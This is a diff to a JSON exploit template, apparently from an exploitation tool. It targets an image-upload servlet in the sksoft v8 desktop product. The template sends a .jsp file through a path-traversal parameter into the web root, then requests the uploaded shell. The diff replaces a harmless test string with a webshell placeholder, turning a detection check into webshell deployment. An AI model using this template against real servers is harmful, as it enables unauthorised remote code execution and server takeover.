@@ -14,12 +14,12 @@
       "Cookie": "JSESSIONID=4BA92D5702E7E76610D094A28FFA681F",
       "Content-Type": "multipart/form-data"
     },
-    "Pattern": "(*.jsp)"
+    "Pattern": "(.*\\.jsp)"
   },
   "exp": {
     "step1": {
       "expGet": "/servlet/com.sksoft.v8.desktop.UploadImage?fileextr=.jsp&rpath=../webapps/ROOT/",
-      "expPost": "<%out.print(\"only test\");%>",
+      "expPost": "{webshell}",
       "header": {
         "Upgrade-Insecure-Requests": "1",
         "User-Agent": "Mozilla/5.0 (Linux;",
@@ -29,7 +29,7 @@
         "Cookie": "JSESSIONID=4BA92D5702E7E76610D094A28FFA681F",
         "Content-Type": "multipart/form-data"
       },
-      "Pattern": "(*.jsp)"
+      "Pattern": "(.*\\.jsp)"
     },
     "step2": {
       "expGet": "/{shellPath}",
